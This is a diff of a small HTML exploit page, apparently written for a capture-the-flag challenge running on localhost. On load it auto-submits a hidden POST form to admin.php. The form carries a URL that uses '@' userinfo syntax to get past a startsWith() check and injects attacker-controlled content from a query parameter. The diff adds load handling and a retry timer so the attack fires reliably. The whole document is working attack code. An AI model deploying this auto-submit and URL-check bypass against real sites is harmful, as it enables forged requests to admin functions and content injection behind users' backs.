@@ -1,18 +1,30 @@
 <!doctype html><meta charset="utf-8">
 <title>auto-post</title>
 <script>
-  // get YAML from ?y=...
-  const y = new URL(location.href).searchParams.get("y") || "";
-  // build the url param that bypasses startsWith() using userinfo
-  const sim = "http://localhost:5000/admin.php@localhost:5000/index.php?html=" + encodeURIComponent(y);
+(function () {
+  function go() {
+    const y = new URL(location.href).searchParams.get("y") || "";
+    const sim = "http://localhost:5000/admin.php@localhost:5000/index.php?html=" + encodeURIComponent(y);
 
-  // make a normal form post (navigates top-level to admin.php)
-  const f = document.createElement("form");
-  f.method = "POST";
-  f.action = "http://localhost:5000/admin.php";
-  const i = document.createElement("input");
-  i.type = "hidden"; i.name = "url"; i.value = sim;
-  f.appendChild(i);
-  document.body.appendChild(f);
-  f.submit(); // top-level will become admin.php response (the flag page)
+    const f = document.createElement("form");
+    f.method = "POST";
+    f.action = "http://localhost:5000/admin.php";
+
+    const i = document.createElement("input");
+    i.type = "hidden"; i.name = "url"; i.value = sim;
+    f.appendChild(i);
+
+    (document.body || document.documentElement).appendChild(f);
+    f.submit();
+  }
+
+  if (document.readyState === "complete" || document.readyState === "interactive") {
+    go();
+  } else {
+    addEventListener("DOMContentLoaded", go);
+  }
+
+  // belt & suspenders: try again shortly in case the first submit races
+  setTimeout(() => { try { go(); } catch (e) {} }, 250);
+})();
 </script>
